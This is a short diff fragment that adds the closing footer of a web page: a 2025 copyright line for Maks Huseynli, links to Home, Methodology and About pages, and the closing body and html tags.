+    <span class="footer-copy">© 2025 Maks Huseynli</span>
+    <div class="footer-links">
+      <a href="../index.html">Home</a>
+      <a href="../methodology.html">Methodology</a>
+      <a href="../about.html">About</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
